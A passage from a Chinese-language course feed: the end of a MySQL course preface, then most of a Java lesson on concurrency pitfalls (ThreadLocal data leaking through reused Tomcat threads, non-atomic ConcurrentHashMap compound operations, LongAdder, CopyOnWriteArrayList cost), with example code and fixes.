&lt;p>但随后我又有了一个新的困惑，我觉得自己了解的 MySQL 知识点是零散的，没有形成网络。于是解决完一个问题后，很容易忘记。再碰到类似的问题，我又得再翻一次代码。&lt;/p>
&lt;p>所幸在阿里工作的时候，我参与了阿里云关系型数据库服务内核的开发，并且负责开发开源分支 AliSQL，让我对 MySQL 内核和源码有了更深层次的研究和理解。在服务内部客户和公有云客户的过程中，我有机会面对和解决足够多的问题，再通过手册进行系统的学习，算是比较坎坷地将 MySQL 的知识网络补了起来。&lt;/p>
&lt;p>所以，在回顾这个过程的时候，我的第一个感受是，如果一开始就有一些从理论到实战的系统性指导，那该多好啊，也许我可以学习得更快些。&lt;/p>
&lt;p>在极客时间团队跟我联系策划这个专栏的时候，我还是持怀疑态度的。为什么呢？现在不比当年了，犹记得十余年前，你使用 MySQL 的过程中碰到问题的话，基本上都只能到代码里去找答案，因为那时网上的资料太少了。&lt;/p>
&lt;p>而近十年来，MySQL 在中国广泛普及，技术分享文章可以说是浩如烟海。所以，现在要系统地介绍一遍 MySQL 的话，恐怕里面提及的大多数知识点，都可以在社区文章中找到。那么我们做这个专栏的意义在哪里，而它又凭什么可以收费呢？&lt;/p>
&lt;p>直到收到极客时间团队的答复，我才开始对这个专栏&amp;quot;想做和可以做&amp;quot;的事情感觉清晰起来。数据库是一个综合系统，其背后是发展了几十年的数据库理论。同时，数据库系统也是一个应用系统，可能一个业务开发人员用了两三年 MySQL，还未必清楚那些自己一直在用的&amp;quot;最佳实践&amp;quot;为什么是最佳的。&lt;/p>
&lt;p>于是，我希望这个专栏能够帮助这样的一些开发者：他们正在使用 MySQL，知道如何写出逻辑正确的 SQL 语句来实现业务目标，却不确定这个语句是不是最优的；他们听说了一些使用数据库的最佳实践，但是更想了解为什么这么做；他们使用的数据库偶尔会出问题，亟需了解如何更快速、更准确地定位问题，甚至自己解决问题&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>在过去的七年里，我带过十几个应届毕业生，看着他们成长，要求他们原理先行，再实践验证。几年下来，他们的成长速度都很快，其中好几个毕业没两年就成为团队的骨干力量了。我也在社招的时候面试过很多有着不错的运维实践经验和能力的候选人，但都因为对数据库原理仅有一知半解的了解，而最终遗憾地没有通过面试。&lt;/p>
&lt;p>因此，我希望这个专栏能够激发开发者对数据库原理的探索欲，从而更好地理解工作中遇到的问题，更能知道背后的为什么。所以&lt;strong>我会选那些平时使用数据库时高频出现的知识，如事务、索引、锁等内容构成专栏的主线&lt;/strong>。这些主线上是一个个的知识点。每个点就是一个概念、一个机制或者一个原理说明。在每个说明之后，我会和你讨论一个实践相关的问题。&lt;/p>
&lt;p>希望能以这样的方式，让你对 MySQL 的几条主线有一个整体的认识，并且了解基本概念。在之后的实践篇中，我会引用到这些主线的知识背景，并着力说明它们是怎样指导实践的。这样，&lt;strong>你可以从点到线，再到面，形成自己的 MySQL 知识网络。&lt;/strong>&lt;/p>
&lt;p>在这里，有一份目录，你也可以先了解下整个专栏的知识结构。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/a7/7e/a78db0b99bbf1149c39b7960f7183c7e.jpg" alt="">&lt;/p>
&lt;p>如前面说的，这几条主线上的每个知识点几乎都不是最新的，有些甚至十年前就这样，并没有改过。但我希望针对这些点的说明，可以让你在使用 MySQL 时心里更有底，知道怎么做选择，并且明白为什么。了解了原理，才能在实践中不断创新，提升个人的价值和工作输出。&lt;/p>
&lt;p>从这里开始，跟我一起搞懂 MySQL!&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/ce/d9/ce7f4e35916ed1aa49206a53a0547bd9.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 01丨使用了并发工具类库，线程安全就高枕无忧了吗？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E4%B8%9A%E5%8A%A1%E5%BC%80%E5%8F%91%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF100%E4%BE%8B/01%E4%B8%A8%E4%BD%BF%E7%94%A8%E4%BA%86%E5%B9%B6%E5%8F%91%E5%B7%A5%E5%85%B7%E7%B1%BB%E5%BA%93%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E5%B0%B1%E9%AB%98%E6%9E%95%E6%97%A0%E5%BF%A7%E4%BA%86%E5%90%97/</link><pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E4%B8%9A%E5%8A%A1%E5%BC%80%E5%8F%91%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF100%E4%BE%8B/01%E4%B8%A8%E4%BD%BF%E7%94%A8%E4%BA%86%E5%B9%B6%E5%8F%91%E5%B7%A5%E5%85%B7%E7%B1%BB%E5%BA%93%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E5%B0%B1%E9%AB%98%E6%9E%95%E6%97%A0%E5%BF%A7%E4%BA%86%E5%90%97/</guid><description>
&lt;p>你好，我是朱晔。作为课程的第一讲，我今天要和你聊聊使用并发工具类库相关的话题。&lt;/p>
&lt;p>在代码审核讨论的时候，我们有时会听到有关线程安全和并发工具的一些片面的观点和结论，比如&amp;quot;把 HashMap 改为 ConcurrentHashMap，就可以解决并发问题了呀&amp;quot;&amp;ldquo;要不我们试试无锁的 CopyOnWriteArrayList 吧，性能更好&amp;rdquo;。事实上，这些说法都不太准确。&lt;/p>
&lt;p>的确，为了方便开发者进行多线程编程，现代编程语言会提供各种并发工具类。但如果我们没有充分了解它们的使用场景、解决的问题，以及最佳实践的话，盲目使用就可能会导致一些坑，小则损失性能，大则无法确保多线程情况下业务逻辑的正确性。&lt;/p>
&lt;p>我需要先说明下，这里的并发工具类是指用来解决多线程环境下并发问题的工具类库。一般而言并发工具包括同步器和容器两大类，业务代码中使用并发容器的情况会多一些，我今天分享的例子也会侧重并发容器。&lt;/p>
&lt;p>接下来，我们就看看在使用并发工具时，最常遇到哪些坑，以及如何解决、避免这些坑吧。&lt;/p>
&lt;h1 id="没有意识到线程重用导致用户信息错乱的-bug">没有意识到线程重用导致用户信息错乱的 Bug&lt;/h1>
&lt;p>之前有业务同学和我反馈，在生产上遇到一个诡异的问题，有时获取到的用户信息是别人的。查看代码后，我发现他使用了 ThreadLocal 来缓存获取到的用户信息。&lt;/p>
&lt;p>我们知道，ThreadLocal 适用于变量在线程间隔离，而在方法或类间共享的场景。如果用户信息的获取比较昂贵（比如从数据库查询用户信息），那么在 ThreadLocal 中缓存数据是比较合适的做法。但，这么做为什么会出现用户信息错乱的 Bug 呢？&lt;/p>
&lt;p>我们看一个具体的案例吧。&lt;/p>
&lt;p>使用 Spring Boot 创建一个 Web 应用程序，使用 ThreadLocal 存放一个 Integer 的值，来暂且代表需要在线程中保存的用户信息，这个值初始是 null。在业务逻辑中，我先从 ThreadLocal 获取一次值，然后把外部传入的参数设置到 ThreadLocal 中，来模拟从当前上下文获取到用户信息的逻辑，随后再获取一次值，最后输出两次获得的值和线程名称。&lt;/p>
&lt;pre tabindex="0">&lt;code>private ThreadLocal&amp;lt;Integer&amp;gt; currentUser = ThreadLocal.withInitial(() -&amp;gt; null);
@GetMapping(&amp;#34;wrong&amp;#34;)
public Map wrong(@RequestParam(&amp;#34;userId&amp;#34;) Integer userId) {
//设置用户信息之前先查询一次ThreadLocal中的用户信息
String before = Thread.currentThread().getName() + &amp;#34;:&amp;#34; + currentUser.get();
//设置用户信息到ThreadLocal
currentUser.set(userId);
//设置用户信息之后再查询一次ThreadLocal中的用户信息
String after = Thread.currentThread().getName() + &amp;#34;:&amp;#34; + currentUser.get();
//汇总输出两次查询结果
Map result = new HashMap();
result.put(&amp;#34;before&amp;#34;, before);
result.put(&amp;#34;after&amp;#34;, after);
return result;
}
&lt;/code>&lt;/pre>&lt;p>按理说，在设置用户信息之前第一次获取的值始终应该是 null，但我们要意识到，程序运行在 Tomcat 中，执行程序的线程是 Tomcat 的工作线程，而 Tomcat 的工作线程是基于线程池的。&lt;/p>
&lt;p>&lt;strong>顾名思义，线程池会重用固定的几个线程，一旦线程重用，那么很可能首次从 ThreadLocal 获取的值是之前其他用户的请求遗留的值。这时，ThreadLocal 中的用户信息就是其他用户的信息。&lt;/strong>&lt;/p>
&lt;p>为了更快地重现这个问题，我在配置文件中设置一下 Tomcat 的参数，把工作线程池最大线程数设置为 1，这样始终是同一个线程在处理请求：&lt;/p>
&lt;pre tabindex="0">&lt;code>server.tomcat.max-threads=1
&lt;/code>&lt;/pre>&lt;p>运行程序后先让用户 1 来请求接口，可以看到第一和第二次获取到用户 ID 分别是 null 和 1，符合预期：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/4b/30/4b8f38415d03423132c7a3608ebe2430.png" alt="">&lt;/p>
&lt;p>随后用户 2 来请求接口，这次就出现了 Bug，第一和第二次获取到用户 ID 分别是 1 和 2，显然第一次获取到了用户 1 的信息，原因就是 Tomcat 的线程池重用了线程。从图中可以看到，两次请求的线程都是同一个线程：http-nio-8080-exec-1。&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/a9/db/a9ccd42716d807687b3acff9a0baf2db.png" alt="">&lt;/p>
&lt;p>这个例子告诉我们，在写业务代码时，首先要理解代码会跑在什么线程上：&lt;/p>
&lt;ul>
&lt;li>我们可能会抱怨学多线程没用，因为代码里没有开启使用多线程。但其实，可能只是我们没有意识到，在 Tomcat 这种 Web 服务器下跑的业务代码，本来就运行在一个多线程环境（否则接口也不可能支持这么高的并发），&lt;strong>并不能认为没有显式开启多线程就不会有线程安全问题&lt;/strong>。&lt;/li>
&lt;li>因为线程的创建比较昂贵，所以 Web 服务器往往会使用线程池来处理请求，这就意味着线程会被重用。这时，&lt;strong>使用类似 ThreadLocal 工具来存放一些数据时，需要特别注意在代码运行完后，显式地去清空设置的数据&lt;/strong>。如果在代码中使用了自定义的线程池，也同样会遇到这个问题。&lt;/li>
&lt;/ul>
&lt;p>理解了这个知识点后，我们修正这段代码的方案是，在代码的 finally 代码块中，显式清除 ThreadLocal 中的数据。这样一来，新的请求过来即使使用了之前的线程也不会获取到错误的用户信息了。修正后的代码如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>@GetMapping(&amp;#34;right&amp;#34;)
public Map right(@RequestParam(&amp;#34;userId&amp;#34;) Integer userId) {
String before = Thread.currentThread().getName() + &amp;#34;:&amp;#34; + currentUser.get();
currentUser.set(userId);
try {
String after = Thread.currentThread().getName() + &amp;#34;:&amp;#34; + currentUser.get();
Map result = new HashMap();
result.put(&amp;#34;before&amp;#34;, before);
result.put(&amp;#34;after&amp;#34;, after);
return result;
} finally {
//在finally代码块中删除ThreadLocal中的数据，确保数据不串
currentUser.remove();
}
}
&lt;/code>&lt;/pre>&lt;p>重新运行程序可以验证，再也不会出现第一次查询用户信息查询到之前用户请求的 Bug：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/0d/cc/0dfe40fca441b58d491fc799d120a7cc.png" alt="">&lt;/p>
&lt;p>ThreadLocal 是利用独占资源的方式，来解决线程安全问题，那如果我们确实需要有资源在线程之前共享，应该怎么办呢？这时，我们可能就需要用到线程安全的容器了。&lt;/p>
&lt;h1 id="使用了线程安全的并发工具并不代表解决了所有线程安全问题">使用了线程安全的并发工具，并不代表解决了所有线程安全问题&lt;/h1>
&lt;p>JDK 1.5 后推出的 ConcurrentHashMap，是一个高性能的线程安全的哈希表容器。&amp;ldquo;线程安全&amp;quot;这四个字特别容易让人误解，因为 &lt;strong>ConcurrentHashMap 只能保证提供的原子性读写操作是线程安全的。&lt;/strong>&lt;/p>
&lt;p>我在相当多的业务代码中看到过这个误区，比如下面这个场景。有一个含 900 个元素的 Map，现在再补充 100 个元素进去，这个补充操作由 10 个线程并发进行。开发人员误以为使用了 ConcurrentHashMap 就不会有线程安全问题，于是不加思索地写出了下面的代码：在每一个线程的代码逻辑中先通过 size 方法拿到当前元素数量，计算 ConcurrentHashMap 目前还需要补充多少元素，并在日志中输出了这个值，然后通过 putAll 方法把缺少的元素添加进去。&lt;/p>
&lt;p>为方便观察问题，我们输出了这个 Map 一开始和最后的元素个数。&lt;/p>
&lt;pre tabindex="0">&lt;code>//线程个数
private static int THREAD_COUNT = 10;
//总元素数量
private static int ITEM_COUNT = 1000;
//帮助方法，用来获得一个指定元素数量模拟数据的ConcurrentHashMap
private ConcurrentHashMap&amp;lt;String, Long&amp;gt; getData(int count) {
return LongStream.rangeClosed(1, count)
.boxed()
.collect(Collectors.toConcurrentMap(i -&amp;gt; UUID.randomUUID().toString(), Function.identity(),
(o1, o2) -&amp;gt; o1, ConcurrentHashMap::new));
}
@GetMapping(&amp;#34;wrong&amp;#34;)
public String wrong() throws InterruptedException {
ConcurrentHashMap&amp;lt;String, Long&amp;gt; concurrentHashMap = getData(ITEM_COUNT - 100);
//初始900个元素
log.info(&amp;#34;init size:{}&amp;#34;, concurrentHashMap.size());
ForkJoinPool forkJoinPool = new ForkJoinPool(THREAD_COUNT);
//使用线程池并发处理逻辑
forkJoinPool.execute(() -&amp;gt; IntStream.rangeClosed(1, 10).parallel().forEach(i -&amp;gt; {
//查询还需要补充多少个元素
int gap = ITEM_COUNT - concurrentHashMap.size();
log.info(&amp;#34;gap size:{}&amp;#34;, gap);
//补充元素
concurrentHashMap.putAll(getData(gap));
}));
//等待所有任务完成
forkJoinPool.shutdown();
forkJoinPool.awaitTermination(1, TimeUnit.HOURS);
//最后元素个数会是1000吗？
log.info(&amp;#34;finish size:{}&amp;#34;, concurrentHashMap.size());
return &amp;#34;OK&amp;#34;;
}
&lt;/code>&lt;/pre>&lt;p>访问接口后程序输出的日志内容如下：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/2e/70/2eaf5cd1b910b2678aca15fee6144070.png" alt="">&lt;/p>
&lt;p>从日志中可以看到：&lt;/p>
&lt;ul>
&lt;li>初始大小 900 符合预期，还需要填充 100 个元素。&lt;/li>
&lt;li>worker1 线程查询到当前需要填充的元素为 36，竟然还不是 100 的倍数。&lt;/li>
&lt;li>worker13 线程查询到需要填充的元素数是负的，显然已经过度填充了。&lt;/li>
&lt;li>最后 HashMap 的总项目数是 1536，显然不符合填充满 1000 的预期。&lt;/li>
&lt;/ul>
&lt;p>针对这个场景，我们可以举一个形象的例子。ConcurrentHashMap 就像是一个大篮子，现在这个篮子里有 900 个桔子，我们期望把这个篮子装满 1000 个桔子，也就是再装 100 个桔子。有 10 个工人来干这件事儿，大家先后到岗后会计算还需要补多少个桔子进去，最后把桔子装入篮子。&lt;/p>
&lt;p>ConcurrentHashMap 这个篮子本身，可以确保多个工人在装东西进去时，不会相互影响干扰，但无法确保工人 A 看到还需要装 100 个桔子但是还未装的时候，工人 B 就看不到篮子中的桔子数量。更值得注意的是，你往这个篮子装 100 个桔子的操作不是原子性的，在别人看来可能会有一个瞬间篮子里有 964 个桔子，还需要补 36 个桔子。&lt;/p>
&lt;p>回到 ConcurrentHashMap，我们需要注意 &lt;strong>ConcurrentHashMap 对外提供的方法或能力的限制&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>使用了 ConcurrentHashMap，不代表对它的多个操作之间的状态是一致的，是没有其他线程在操作它的，如果需要确保需要手动加锁。&lt;/li>
&lt;li>诸如 size、isEmpty 和 containsValue 等聚合方法，在并发情况下可能会反映 ConcurrentHashMap 的中间状态。因此在并发情况下，这些方法的返回值只能用作参考，而不能用于流程控制。显然，利用 size 方法计算差异值，是一个流程控制。&lt;/li>
&lt;li>诸如 putAll 这样的聚合方法也不能确保原子性，在 putAll 的过程中去获取数据可能会获取到部分数据。&lt;/li>
&lt;/ul>
&lt;p>代码的修改方案很简单，整段逻辑加锁即可：&lt;/p>
&lt;pre tabindex="0">&lt;code>@GetMapping(&amp;#34;right&amp;#34;)
public String right() throws InterruptedException {
ConcurrentHashMap&amp;lt;String, Long&amp;gt; concurrentHashMap = getData(ITEM_COUNT - 100);
log.info(&amp;#34;init size:{}&amp;#34;, concurrentHashMap.size());
ForkJoinPool forkJoinPool = new ForkJoinPool(THREAD_COUNT);
forkJoinPool.execute(() -&amp;gt; IntStream.rangeClosed(1, 10).parallel().forEach(i -&amp;gt; {
//下面的这段复合逻辑需要锁一下这个ConcurrentHashMap
synchronized (concurrentHashMap) {
int gap = ITEM_COUNT - concurrentHashMap.size();
log.info(&amp;#34;gap size:{}&amp;#34;, gap);
concurrentHashMap.putAll(getData(gap));
}
}));
forkJoinPool.shutdown();
forkJoinPool.awaitTermination(1, TimeUnit.HOURS);
log.info(&amp;#34;finish size:{}&amp;#34;, concurrentHashMap.size());
return &amp;#34;OK&amp;#34;;
}
&lt;/code>&lt;/pre>&lt;p>重新调用接口，程序的日志输出结果符合预期：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/11/b8/1151b5b87f27073725060b76c56d95b8.png" alt="">&lt;/p>
&lt;p>可以看到，只有一个线程查询到了需要补 100 个元素，其他 9 个线程查询到不需要补元素，最后 Map 大小为 1000。&lt;/p>
&lt;p>到了这里，你可能又要问了，使用 ConcurrentHashMap 全程加锁，还不如使用普通的 HashMap 呢。&lt;/p>
&lt;p>其实不完全是这样。&lt;/p>
&lt;p>ConcurrentHashMap 提供了一些原子性的简单复合逻辑方法，用好这些方法就可以发挥其威力。这就引申出代码中常见的另一个问题：在使用一些类库提供的高级工具类时，开发人员可能还是按照旧的方式去使用这些新类，因为没有使用其特性，所以无法发挥其威力。&lt;/p>
&lt;h1 id="没有充分了解并发工具的特性从而无法发挥其威力">没有充分了解并发工具的特性，从而无法发挥其威力&lt;/h1>
&lt;p>我们来看一个使用 Map 来统计 Key 出现次数的场景吧，这个逻辑在业务代码中非常常见。&lt;/p>
&lt;ul>
&lt;li>使用 ConcurrentHashMap 来统计，Key 的范围是 10。&lt;/li>
&lt;li>使用最多 10 个并发，循环操作 1000 万次，每次操作累加随机的 Key。&lt;/li>
&lt;li>如果 Key 不存在的话，首次设置值为 1。&lt;/li>
&lt;/ul>
&lt;p>代码如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>//循环次数
private static int LOOP_COUNT = 10000000;
//线程数量
private static int THREAD_COUNT = 10;
//元素数量
private static int ITEM_COUNT = 1000;
private Map&amp;lt;String, Long&amp;gt; normaluse() throws InterruptedException {
ConcurrentHashMap&amp;lt;String, Long&amp;gt; freqs = new ConcurrentHashMap&amp;lt;&amp;gt;(ITEM_COUNT);
ForkJoinPool forkJoinPool = new ForkJoinPool(THREAD_COUNT);
forkJoinPool.execute(() -&amp;gt; IntStream.rangeClosed(1, LOOP_COUNT).parallel().forEach(i -&amp;gt; {
//获得一个随机的Key
String key = &amp;#34;item&amp;#34; + ThreadLocalRandom.current().nextInt(ITEM_COUNT);
synchronized (freqs) {
if (freqs.containsKey(key)) {
//Key存在则+1
freqs.put(key, freqs.get(key) + 1);
} else {
//Key不存在则初始化为1
freqs.put(key, 1L);
}
}
}
));
forkJoinPool.shutdown();
forkJoinPool.awaitTermination(1, TimeUnit.HOURS);
return freqs;
}
&lt;/code>&lt;/pre>&lt;p>我们吸取之前的教训，直接通过锁的方式锁住 Map，然后做判断、读取现在的累计值、加 1、保存累加后值的逻辑。这段代码在功能上没有问题，但无法充分发挥 ConcurrentHashMap 的威力，改进后的代码如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>private Map&amp;lt;String, Long&amp;gt; gooduse() throws InterruptedException {
ConcurrentHashMap&amp;lt;String, LongAdder&amp;gt; freqs = new ConcurrentHashMap&amp;lt;&amp;gt;(ITEM_COUNT);
ForkJoinPool forkJoinPool = new ForkJoinPool(THREAD_COUNT);
forkJoinPool.execute(() -&amp;gt; IntStream.rangeClosed(1, LOOP_COUNT).parallel().forEach(i -&amp;gt; {
String key = &amp;#34;item&amp;#34; + ThreadLocalRandom.current().nextInt(ITEM_COUNT);
//利用computeIfAbsent()方法来实例化LongAdder，然后利用LongAdder来进行线程安全计数
freqs.computeIfAbsent(key, k -&amp;gt; new LongAdder()).increment();
}
));
forkJoinPool.shutdown();
forkJoinPool.awaitTermination(1, TimeUnit.HOURS);
//因为我们的Value是LongAdder而不是Long，所以需要做一次转换才能返回
return freqs.entrySet().stream()
.collect(Collectors.toMap(
e -&amp;gt; e.getKey(),
e -&amp;gt; e.getValue().longValue())
);
}
&lt;/code>&lt;/pre>&lt;p>在这段改进后的代码中，我们巧妙利用了下面两点：&lt;/p>
&lt;ul>
&lt;li>使用 ConcurrentHashMap 的原子性方法 computeIfAbsent 来做复合逻辑操作，判断 Key 是否存在 Value，如果不存在则把 Lambda 表达式运行后的结果放入 Map 作为 Value，也就是新创建一个 LongAdder 对象，最后返回 Value。&lt;/li>
&lt;li>由于 computeIfAbsent 方法返回的 Value 是 LongAdder，是一个线程安全的累加器，因此可以直接调用其 increment 方法进行累加。&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>这样在确保线程安全的情况下达到极致性能，把之前 7 行代码替换为了 1 行。&lt;/strong>&lt;/p>
&lt;p>我们通过一个简单的测试比较一下修改前后两段代码的性能：&lt;/p>
&lt;pre tabindex="0">&lt;code>@GetMapping(&amp;#34;good&amp;#34;)
public String good() throws InterruptedException {
StopWatch stopWatch = new StopWatch();
stopWatch.start(&amp;#34;normaluse&amp;#34;);
Map&amp;lt;String, Long&amp;gt; normaluse = normaluse();
stopWatch.stop();
//校验元素数量
Assert.isTrue(normaluse.size() == ITEM_COUNT, &amp;#34;normaluse size error&amp;#34;);
//校验累计总数
Assert.isTrue(normaluse.entrySet().stream()
.mapToLong(item -&amp;gt; item.getValue()).reduce(0, Long::sum) == LOOP_COUNT
, &amp;#34;normaluse count error&amp;#34;);
stopWatch.start(&amp;#34;gooduse&amp;#34;);
Map&amp;lt;String, Long&amp;gt; gooduse = gooduse();
stopWatch.stop();
Assert.isTrue(gooduse.size() == ITEM_COUNT, &amp;#34;gooduse size error&amp;#34;);
Assert.isTrue(gooduse.entrySet().stream()
.mapToLong(item -&amp;gt; item.getValue())
.reduce(0, Long::sum) == LOOP_COUNT
, &amp;#34;gooduse count error&amp;#34;);
log.info(stopWatch.prettyPrint());
return &amp;#34;OK&amp;#34;;
}
&lt;/code>&lt;/pre>&lt;p>这段测试代码并无特殊之处，使用 StopWatch 来测试两段代码的性能，最后跟了一个断言判断 Map 中元素的个数以及所有 Value 的和，是否符合预期来校验代码的正确性。测试结果如下：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/75/3a/751d484ecd8c3114c15588e7fff3263a.png" alt="">&lt;/p>
&lt;p>可以看到，&lt;strong>优化后的代码，相比使用锁来操作 ConcurrentHashMap 的方式，性能提升了 10 倍&lt;/strong>。&lt;/p>
&lt;p>你可能会问，computeIfAbsent 为什么如此高效呢？&lt;/p>
&lt;p>答案就在源码最核心的部分，也就是 Java 自带的 Unsafe 实现的 CAS。它在虚拟机层面确保了写入数据的原子性，比加锁的效率高得多：&lt;/p>
&lt;pre tabindex="0">&lt;code> static final &amp;lt;K,V&amp;gt; boolean casTabAt(Node&amp;lt;K,V&amp;gt;[] tab, int i,
Node&amp;lt;K,V&amp;gt; c, Node&amp;lt;K,V&amp;gt; v) {
return U.compareAndSetObject(tab, ((long)i &amp;lt;&amp;lt; ASHIFT) + ABASE, c, v);
}
&lt;/code>&lt;/pre>&lt;p>像 ConcurrentHashMap 这样的高级并发工具的确提供了一些高级 API，只有充分了解其特性才能最大化其威力，而不能因为其足够高级、酷炫盲目使用。&lt;/p>
&lt;h1 id="没有认清并发工具的使用场景因而导致性能问题">没有认清并发工具的使用场景，因而导致性能问题&lt;/h1>
&lt;p>除了 ConcurrentHashMap 这样通用的并发工具类之外，我们的工具包中还有些针对特殊场景实现的生面孔。一般来说，针对通用场景的通用解决方案，在所有场景下性能都还可以，属于&amp;quot;万金油&amp;rdquo;；而针对特殊场景的特殊实现，会有比通用解决方案更高的性能，但一定要在它针对的场景下使用，否则可能会产生性能问题甚至是 Bug。&lt;/p>
&lt;p>之前在排查一个生产性能问题时，我们发现一段简单的非数据库操作的业务逻辑，消耗了超出预期的时间，在修改数据时操作本地缓存比回写数据库慢许多。查看代码发现，开发同学使用了 CopyOnWriteArrayList 来缓存大量的数据，而数据变化又比较频繁。&lt;/p>
&lt;p>CopyOnWrite 是一个时髦的技术，不管是 Linux 还是 Redis 都会用到。&lt;strong>在 Java 中，CopyOnWriteArrayList 虽然是一个线程安全的 ArrayList，但因为其实现方式是，每次修改数据时都会复制一份数据出来，所以有明显的适用场景，即读多写少或者说希望无锁读的场景。&lt;/strong>&lt;/p>
&lt;p>如果我们要使用 CopyOnWriteArrayList，那一定是因为场景需要而不是因为足够酷炫。如果读写比例均衡或者有大量写操作的话，使用 CopyOnWriteArrayList 的性能会非常糟糕。&lt;/p>
&lt;p>我们写一段测试代码，来比较下使用 CopyOnWriteArrayList 和普通加锁方式 ArrayList 的读写性能吧。在这段代码中我们针对并发读和并发写分别写了一个测试方法，测试两者一定次数的写或读操作的耗时。&lt;/p>
&lt;pre tabindex="0">&lt;code>//测试并发写的性能
@GetMapping(&amp;#34;write&amp;#34;)
public Map testWrite() {
List&amp;lt;Integer&amp;gt; copyOnWriteArrayList = new CopyOnWriteArrayList&amp;lt;&amp;gt;();
List&amp;lt;Integer&amp;gt; synchronizedList = Collections.synchronizedList(new ArrayList&amp;lt;&amp;gt;());
StopWatch stopWatch = new StopWatch();
int loopCount = 100000;
stopWatch.start(&amp;#34;Write:copyOnWriteArrayList&amp;#34;);
//循环100000次并发往CopyOnWriteArrayList写入随机元素
IntStream.rangeClosed(1, loopCount).parallel().forEach(__ -&amp;gt; copyOnWriteArrayList.add(ThreadLocalRandom.current().nextInt(loopCount)));
stopWatch.stop();
stopWatch.start(&amp;#34;Write:synchronizedList&amp;#34;);
//循环100000次并发往加锁的ArrayList写入随机元素
IntStream.rangeClosed(1, loopCount).parallel().forEach(__ -&amp;gt; synchronizedList.add(ThreadLocalRandom.current().nextInt(loopCount)));
stopWatch.stop();
log.info(stopWatch.prettyPrint());
Map result = new HashMap();
result.put(&amp;#34;copyOnWriteArrayList&amp;#34;, copyOnWriteArrayList.size());
result.put(&amp;#34;synchronizedList&amp;#34;, synchronizedList.size());
return result;
}
//帮助方法用来填充List
private void addAll(List&amp;lt;Integer&amp;gt; list) {
list.addAll(IntStream.rangeClosed(1, 1000000).boxed().collect(Collectors.toList()));
}
//测试并发读的性能
@GetMapping(&amp;#34;read&amp;#34;)
public Map testRead() {
//创建两个测试对象
List&amp;lt;Integer&amp;gt; copyOnWriteArrayList = new CopyOnWriteArrayList&amp;lt;&amp;gt;();
List&amp;lt;Integer&amp;gt; synchronizedList = Collections.synchronizedList(new ArrayList&amp;lt;&amp;gt;());
//填充数据
addAll(copyOnWriteArrayList);
addAll(synchronizedList);
StopWatch stopWatch = new StopWatch();
int loopCount = 1000000;
int count = copyOnWriteArrayList.size();
stopWatch.start(&amp;#34;Read:copyOnWriteArrayList&amp;#34;);
//循环1000000次并发从CopyOnWriteArrayList随机查询元素
IntStream.rangeClosed(1, loopCount).parallel().forEach(__ -&amp;gt; copyOnWriteArrayList.get(ThreadLocalRandom.current().nextInt(count)));
stopWatch.stop();
stopWatch.start(&amp;#34;Read:synchronizedList&amp;#34;);
//循环1000000次并发从加锁的ArrayList随机查询元素
IntStream.range(0, loopCount).parallel().forEach(__ -&amp;gt; synchronizedList.get(ThreadLocalRandom.current().nextInt(count)));
stopWatch.stop();
log.info(stopWatch.prettyPrint());
Map result = new HashMap();
result.put(&amp;#34;copyOnWriteArrayList&amp;#34;, copyOnWriteArrayList.size());
result.put(&amp;#34;synchronizedList&amp;#34;, synchronizedList.size());
return result;
}
&lt;/code>&lt;/pre>&lt;p>运行程序可以看到，**大量写的场景（10 万次 add 操作），**&lt;strong>CopyOnWriteArray 几乎比同步的 ArrayList 慢一百倍&lt;/strong>：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/97/b4/9789fe2019a1267b7883606b60e498b4.png" alt="">&lt;/p>
&lt;p>而在大量读的场景下（100 万次 get 操作），CopyOnWriteArray 又比同步的 ArrayList 快五倍以上：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/30/36/30ba652fb3295c58b03f51de0a132436.png" alt="">&lt;/p>
&lt;p>你可能会问，为何在大量写的场景下，CopyOnWriteArrayList 会这么慢呢？&lt;/p>
&lt;p>答案就在源码中。以 add 方法为例，每次 add 时，都会用 Arrays.copyOf 创建一个新数组，频繁 add 时内存的申请释放消耗会很大：&lt;/p>
&lt;pre tabindex="0">&lt;code> /**
* Appends the specified element to the end of this list.
*
* @param e element to be appended to this list
* @return {@code true} (as specified by {@link Collection#add})
*/
public boolean add(E e) {
synchronized (lock) {
Object[] elements = getArray();
int len = elements.length;
Object[] newElements = Arrays.copyOf(elements, len + 1);
newElements[len] = e;
setArray(newElements);
return true;
}
}
&lt;/code>&lt;/pre>&lt;h1 id="重点回顾">重点回顾&lt;/h1>
&lt;p>今天，我主要与你分享了，开发人员使用并发工具来解决线程安全问题时容易犯的四类错。&lt;/p>
&lt;p>一是，只知道使用并发工具，但并不清楚当前线程的来龙去脉，解决多线程问题却不了解线程。比如，使用 ThreadLocal 来缓存数据，以为 ThreadLocal 在线程之间做了隔离不会有线程安全问题，没想到线程重用导致数据串了。请务必记得，在业务逻辑结束之前清理 ThreadLocal 中的数据。&lt;/p>
&lt;p>二是，误以为使用了并发工具就可以解决一切线程安全问题，期望通过把线程不安全的类替换为线程安全的类来一键解决问题。比如，认为使用了 ConcurrentHashMap 就可以解决线程安全问题，没对复合逻辑加锁导致业务逻辑错误。如果你希望在一整段业务逻辑中，对容器的操作都保持整体一致性的话，需要加锁处理。&lt;/p>
